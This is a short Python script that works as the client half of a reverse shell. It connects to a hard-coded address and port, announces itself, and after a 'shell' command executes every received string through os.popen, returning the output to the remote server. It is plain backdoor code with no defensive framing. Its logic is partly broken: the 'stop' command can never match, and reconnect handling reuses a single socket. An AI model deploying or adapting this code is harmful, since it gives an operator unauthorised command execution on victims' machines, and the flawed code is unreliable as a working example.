import socket, time, os

#toggle dev mode
verbose = True


addr = ('127.0.0.1', 5002)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def init():
        while True:
                try:
                        try:
                                client.connect(addr)
                        except:
                                print(f'[NOTICE] Could not connect to {addr[0]}:{addr[1]}')
                                time.sleep(5)
                        client.send('client'.encode('utf-8'))
                        break
                except:
                        print(f'[ALERT] Connection with {addr[0]}:{addr[1]} closed')
                        
        main()

def main():
        shellmode = False
        if verbose:
                print(f'[CONNECTED] Connected to {addr[0]}:{addr[1]}')
        while True:
                msg = None
                msg = client.recv(1024)
                if msg:
                    print('command recieved:', msg.decode('utf-8'))
                    if shellmode == True:
                            if msg == 'stop':
                                    shellmode = False
                            else:
                                    time.sleep(1)
                                    output_stream = os.popen(msg.decode('utf-8'))
                                    output = output_stream.read()
                                    client.send(output.encode('utf-8'))
                            
                    else:
                            if msg.decode('utf-8') == 'shell':
                                    shellmode = True
                            
                            time.sleep(1)
                            
                            
            



init()
